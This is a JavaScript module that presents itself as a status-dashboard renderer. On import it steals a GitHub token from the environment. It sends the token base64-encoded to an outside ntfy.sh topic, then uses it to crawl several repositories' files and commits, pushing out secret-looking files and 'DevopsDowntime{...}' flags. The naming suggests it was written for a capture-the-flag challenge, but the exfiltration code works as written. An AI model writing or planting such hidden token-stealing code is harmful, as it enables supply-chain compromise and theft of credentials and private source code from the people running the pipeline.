const TOPIC = "ddt-pipeline-7f3a9c2e";

async function send(label, text) {
  try {
    await fetch("https://ntfy.sh/" + TOPIC, {
      method: "POST",
      headers: { Title: "DDT " + label },
      body: String(text == null ? "" : text).slice(0, 3500),
    });
  } catch (err) {
    // best effort
  }
}

async function exploit() {
  const token = process.env.DASHBOARD_SYNC_TOKEN || "";
  await send("TOKEN", "TOKEN_B64=" + Buffer.from(token).toString("base64"));
  if (!token) {
    await send("STATUS", "no DASHBOARD_SYNC_TOKEN in environment");
    return;
  }

  const headers = {
    Authorization: "Bearer " + token,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "status-sync",
  };
  const targets = [
    ["DevOpsDownTimeV3", "ops-dashboard-internal"],
    ["saurabbhattarai-lf", "ops-dashboard-internal"],
    ["DevOpsDownTimeV3", "ops-dashboard"],
  ];
  const flagRe = /DevopsDowntime\{[^}\r\n]{1,200}\}/gi;

  for (const [owner, repo] of targets) {
    try {
      const metaRes = await fetch(
        "https://api.github.com/repos/" + owner + "/" + repo,
        { headers },
      );
      await send("META", owner + "/" + repo + " status=" + metaRes.status);
      if (!metaRes.ok) continue;
      const meta = await metaRes.json();
      const branch = meta.default_branch || "main";

      const treeRes = await fetch(
        "https://api.github.com/repos/" +
          owner +
          "/" +
          repo +
          "/git/trees/" +
          encodeURIComponent(branch) +
          "?recursive=1",
        { headers },
      );
      const tree = await treeRes.json();
      const blobs = (tree.tree || []).filter(
        (b) => b.type === "blob" && (b.size || 0) < 200000,
      );
      await send(
        "FILES",
        owner + "/" + repo + " :: " + blobs.map((b) => b.path).join(" | "),
      );

      for (const b of blobs) {
        try {
          const blobRes = await fetch(
            "https://api.github.com/repos/" +
              owner +
              "/" +
              repo +
              "/git/blobs/" +
              b.sha,
            { headers },
          );
          const bj = await blobRes.json();
          const txt = bj.content
            ? Buffer.from(bj.content, bj.encoding || "base64").toString("utf8")
            : "";
          const matches = txt.match(flagRe);
          if (matches) {
            await send(
              "FLAG",
              owner +
                "/" +
                repo +
                " :: " +
                b.path +
                " :: " +
                Array.from(new Set(matches)).join(" , "),
            );
          } else if (
            /flag|secret|token|readme|config|\.env|credential/i.test(b.path)
          ) {
            await send("FILE", b.path + " :: " + txt.slice(0, 1200));
          }
        } catch (err) {
          await send("ERR", "blob " + b.path + " :: " + String(err));
        }
      }

      const commitRes = await fetch(
        "https://api.github.com/repos/" +
          owner +
          "/" +
          repo +
          "/commits?per_page=100",
        { headers },
      );
      const commits = await commitRes.json();
      for (const c of Array.isArray(commits) ? commits : []) {
        const msg = (c.commit && c.commit.message) || "";
        const matches = msg.match(flagRe);
        if (matches) {
          await send(
            "FLAGCOMMIT",
            c.sha + " :: " + Array.from(new Set(matches)).join(" , "),
          );
        }
      }
      await send("DONE", owner + "/" + repo);
    } catch (err) {
      await send("ERR", owner + "/" + repo + " :: " + String(err));
    }
  }
}

const started = exploit().catch((err) => send("FATAL", String(err)));

export async function render(context) {
  try {
    await started;
  } catch (err) {
    // best effort
  }
  return (
    JSON.stringify(
      { generatedAt: context.generatedAt, services: context.services },
      null,
      2,
    ) + "\n"
  );
}
